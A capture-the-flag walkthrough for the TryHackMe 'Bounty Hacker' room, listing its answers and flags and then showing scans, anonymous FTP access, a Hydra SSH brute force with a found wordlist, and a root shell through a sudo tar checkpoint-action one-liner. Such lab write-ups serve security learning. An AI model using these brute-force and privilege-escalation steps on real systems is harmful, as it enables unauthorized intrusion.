# <div align="center">[Bounty Hacker](https://tryhackme.com/r/room/cowboyhacker)</div>
<div align="center">
<img src="https://github.com/user-attachments/assets/a1c1a330-8473-4c7d-afc9-8ed0e17fe801" height="200"></img>
</div>

##  Task 1 . Living up to the title.

#### Ques 1. Deploy the machine.
```
No need
```
#### Ques 2. Find open ports on the machine
```
No need
```
#### Ques 3. Who wrote the task list? 
```
lin
```
#### Ques 4. What service can you bruteforce with the text file found?
```
ssh
```
#### Ques 5. What is the users password?
```
RedDr4gonSynd1cat3
```
#### Ques 6. user.txt
```
THM{CR1M3_SyNd1C4T3}
```
#### Ques 7. root.txt
```
THM{80UN7Y_h4cK3r}
```

# Walkthrough

## 1. Let scan The Ip we got

```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ nmap -sV 10.10.67.0 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-13 16:01 IST
Nmap scan report for 10.10.67.0
Host is up (0.26s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.49 seconds
```
## 2. Ok so Ftp is open let try to enter with default credentials
#### Ftp default credentials is ```Anonymous```
```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ ftp 10.10.67.0       
Connected to 10.10.67.0.
220 (vsFTPd 3.0.3)
Name (10.10.67.0:death): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```
### let find something usefull
```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ ftp 10.10.67.0
Connected to 10.10.67.0.
220 (vsFTPd 3.0.3)
Name (10.10.67.0:death): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||26452|)
ftp: Can't connect to `10.10.67.0:26452': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> 
```
### We get some text file, Let download it to our system
```
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*************************************************************************************************************************************************************************************************|   418        3.99 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.15 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*************************************************************************************************************************************************************************************************|    68        1.13 MiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.32 KiB/s)
ftp> 
```
### AS we read First txt-file we have Passwords maybe
```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ cat locks.txt  
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
### And in Second file We found User
```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
## 3. Let Check for Web-directory once, So we dont miss any details,
### There Are some name present in webpage maybe they are other user
```
──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ dirsearch -u 10.10.67.0
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/Bugbounty-hunter/reports/_10.10.67.0/_24-04-13_16-10-50.txt

Target: http://10.10.67.0/

[16:10:56] Starting: 
[16:11:12] 403 -  275B  - /.ht_wsr.txt
[16:11:12] 403 -  275B  - /.htaccess.bak1
[16:11:12] 403 -  275B  - /.htaccess.orig
[16:11:12] 403 -  275B  - /.htaccess.sample
[16:11:12] 403 -  275B  - /.htaccess_extra
[16:11:12] 403 -  275B  - /.htaccess_sc
[16:11:12] 403 -  275B  - /.htaccessOLD
[16:11:12] 403 -  275B  - /.htaccess.save
[16:11:12] 403 -  275B  - /.htaccess_orig
[16:11:12] 403 -  275B  - /.htaccessBAK
[16:11:12] 403 -  275B  - /.htaccessOLD2
[16:11:12] 403 -  275B  - /.htm
[16:11:12] 403 -  275B  - /.html
[16:11:13] 403 -  275B  - /.httr-oauth
[16:11:13] 403 -  275B  - /.htpasswds
[16:11:13] 403 -  275B  - /.htpasswd_test
[16:13:28] 200 -  455B  - /images/
[16:13:28] 301 -  309B  - /images  ->  http://10.10.67.0/images/
[16:14:16] 403 -  275B  - /server-status/
[16:14:16] 403 -  275B  - /server-status

Task Completed
```
### Nothing much useful

## 4. Let Brute Ssh 
### As we have ```lin``` user and password wordlist so let brute ssh using Hydra
```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ hydra -l lin -P locks.txt ssh://10.10.67.0 -V     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-13 16:19:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.67.0:22/
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "rEddrAGON" - 1 of 26 [child 0] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "ReDdr4g0nSynd!cat3" - 2 of 26 [child 1] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "Dr@gOn$yn9icat3" - 3 of 26 [child 2] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "R3DDr46ONSYndIC@Te" - 4 of 26 [child 3] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "ReddRA60N" - 5 of 26 [child 4] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "R3dDrag0nSynd1c4te" - 6 of 26 [child 5] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "dRa6oN5YNDiCATE" - 7 of 26 [child 6] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "ReDDR4g0n5ynDIc4te" - 8 of 26 [child 7] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "R3Dr4gOn2044" - 9 of 26 [child 8] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "RedDr4gonSynd1cat3" - 10 of 26 [child 9] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "R3dDRaG0Nsynd1c@T3" - 11 of 26 [child 10] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "Synd1c4teDr@g0n" - 12 of 26 [child 11] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "reddRAg0N" - 13 of 26 [child 12] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "REddRaG0N5yNdIc47e" - 14 of 26 [child 13] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "Dra6oN$yndIC@t3" - 15 of 26 [child 14] (0/0)
[ATTEMPT] target 10.10.67.0 - login "lin" - pass "4L1mi6H71StHeB357" - 16 of 26 [child 15] (0/0)
[22][ssh] host: 10.10.67.0   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-13 16:19:49
```
### We got The ssh password let Login
```
┌──(death㉿esther)-[~/Lab-CTF/Bugbounty-hunter]
└─$ ssh lin@10.10.67.0                                                                              
The authenticity of host '10.10.67.0 (10.10.67.0)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.67.0' (ED25519) to the list of known hosts.
lin@10.10.67.0's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ 
```
## Let find User.txt
```
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$ 
```
### That was easy 
## 5. Privilege Escalation
```
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$
```
### OK Let Find it on gtfobins

```
https://gtfobins.github.io/gtfobins/tar/
```

<div align="center">
<img src="https://github.com/user-attachments/assets/0049f4d7-e98c-4688-9a86-0d20e2759e71" height="400"></img>
</div>

### Ok Let copy all 
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
#
```
## We Got root
```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls     
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
#  
```
## Done 
# 😄
